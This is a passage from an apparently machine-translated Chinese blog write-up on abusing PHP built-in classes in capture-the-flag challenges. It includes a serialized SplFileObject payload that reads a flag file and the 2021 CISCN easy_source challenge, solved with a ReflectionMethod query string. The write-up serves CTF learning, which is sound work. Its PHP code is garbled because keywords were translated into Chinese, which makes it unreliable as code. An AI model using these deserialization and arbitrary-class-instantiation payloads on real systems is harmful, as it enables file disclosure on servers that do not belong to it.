    
      
    class  A { public $class = 'SplFileObject' ;    // SplFileObject("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php") public $para = "/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php" ; 公共$check ;     }  
           
          
           
           
      
      
    $poc   = new A();   
    回声序列化（$poc）；  
      
  
---|---  
  
`  
`

`得到有效载荷：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    O: 1 : "A" : 3 :{s: 5 : "class" ;s: 13 : "SplFileObject" ;s: 4 : "para" ;s: 55 : "/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag .php" ;s: 5 : "check" ;N;}  
      
  
---|---  
  
`  
`

`![]()`

# `使用 ReflectionMethod 类获取类方法的相关信息`

`ReflectionMethod 类报告了一个方法的相关信息。它可以在 PHP 运行状态中，扩展分析 PHP
程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。动态调用对象的方法的功能反射API。`

`ReflectionMethod
有很多继承方法可以使用，比如这个`getDocComment()`方法，我们可以用它来获取类中各种函数注释内容，如下图所示：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084320.png)`

## `[2021 CISCN]easy_source`

`题目源码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48   
    49   
    50   
    51   
    52   
    53   
    54   
    55   
    56   
    57  
    58   
    59   
    60   
    61   
    62   
    63   
    64   
    65   
    66   
    67   
    68   
    69   
    70   
    71   
    72   
    73   
    74   
    75   
    76   
    77   
    78   
    79   
    80   
    81   
    82   
    83   
    84   
    85   
    86   
    87   
    88   
    89   
    90   
    91   
    92   
    93   
    94   
    95   
    96   
    97   
    98   
    99   
    100   
    101   
    102   
    103   
    104   
    105   
    106   
    107   
    108   
    109   
    110   
    111   
    112   
    113  
    

|

    
    
      
    类 用户  
    {私有静态$c = 0 ;  
            
      
        函数 a ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 b ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 c ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 d ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 e ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 f ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 g ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 h ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 i ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 j ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 k ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 l ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 m ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 n ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 o ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 p ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 q ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 r ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 s ()  
         {返回++自我:: $c ;     }  
              
      
      
        函数 t ()  
         {返回++自我:: $c ;     } }  
              
      
          
      
      
    $rc = $_GET [ "rc" ];    // 丛林类名  
    $rb = $_GET [ "rb" ];    // 极类属性  
    $ra = $_GET [ "ra" ];    // 极类属性  
    $rd = $_GET [ "rd" ];    // 奇异类方法  
    $method = new  $rc ( $ra , $rb );    // 实例化刚开始的原生类  
    var_dump( $method -> $rd ());     // 调用类中的方法  
      
  
---|---  
  
`  
`

`看代码的应该是调用PHP原生类。我们呼吸标志是藏在类的注释中，而且我们能够实例化任意类，并调用类方法，那么就可以利用PHP内置类中的`ReflectionMethod`类中的`getDocComment()`来读取`User`类里面各种函数的注释。`

`所以有效载荷如下：`

`  
`

``

`代码`

``

    
    
    1  
    

|

    
    
    ?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084321.png)`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084322.png)`

`  
`

`![]()`

` **点分享**  
`

`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084323.png)`

` **点收藏**`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084324.png)`

` **点点赞**`

`![]()`

` **点在看**`

`  
`

  

![]()

sample SK

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

PHP原生类的利用小结

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

